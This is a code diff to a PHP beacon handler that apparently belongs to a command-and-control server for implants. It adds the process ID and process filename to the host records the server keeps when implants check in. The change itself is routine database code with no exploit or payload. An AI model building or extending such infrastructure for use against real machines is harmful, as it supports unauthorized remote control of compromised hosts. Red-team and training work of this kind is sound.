@@ -19,6 +19,10 @@
     $os = urldecode($_POST["os"]);
     $architecture = urldecode($_POST["architecture"]);
 
+    # Stores process related informaton from beacon
+    $pid = $_POST["pid"];
+    $pfilename = $_POST["pfilename"];
+
     # Gets the current date and time in UTC
     # This will be used to update the beacon date in the "hosts" table
     $date = gmdate("Y-m-d H:i:s");
@@ -35,13 +39,29 @@
     $rowCount = $statement->rowCount();
     
     # This is a host that has beaconed previously
-    # We need to update the beacon date in the "hosts" table
+    # We need to update the beacon information (date, pid, and pfilename) in the "hosts" table
     # We also need to see if it has anything tasked
     if ($rowCount == 1)
     {
       # Updates the implant's beacon date in the "hosts" table
       $statement = $dbConnection->prepare("UPDATE hosts SET date = :date WHERE hostname = :hostname AND architecture = :architecture AND os = :os");
       $statement->bindValue(":date", $date);
+      $statement->bindValue(":hostname", $hostname);
+      $statement->bindValue(":architecture", $architecture);
+      $statement->bindValue(":os", $os);
+      $statement->execute();
+
+      # Updates the implant's process filename in the "hosts" table
+      $statement = $dbConnection->prepare("UPDATE hosts SET pfilename = :pfilename WHERE hostname = :hostname AND architecture = :architecture AND os = :os");
+      $statement->bindValue(":pfilename", $pfilename);
+      $statement->bindValue(":hostname", $hostname);
+      $statement->bindValue(":architecture", $architecture);
+      $statement->bindValue(":os", $os);
+      $statement->execute();
+
+      # Updates the implant's process ID in the "hosts" table
+      $statement = $dbConnection->prepare("UPDATE hosts SET pid = :pid WHERE hostname = :hostname AND architecture = :architecture AND os = :os");
+      $statement->bindValue(":pid", $pid);
       $statement->bindValue(":hostname", $hostname);
       $statement->bindValue(":architecture", $architecture);
       $statement->bindValue(":os", $os);
@@ -78,11 +98,13 @@
     else
     {
       # New beaconing host gets added to the "hosts" table
-      $statement = $dbConnection->prepare("INSERT INTO hosts (hostname, date, os, architecture) VALUES (:hostname, :date, :os, :architecture)");
+      $statement = $dbConnection->prepare("INSERT INTO hosts (hostname, date, os, architecture, pid, pfilename) VALUES (:hostname, :date, :os, :architecture, :pid, :pfilename)");
       $statement->bindValue(":hostname", $hostname);
       $statement->bindValue(":date", $date);
       $statement->bindValue(":os", $os);
       $statement->bindValue("architecture", $architecture);
+      $statement->bindValue("pid", $pid);
+      $statement->bindValue("pfilename", $pfilename);
       $statement->execute();
 
       # Kills the database connection
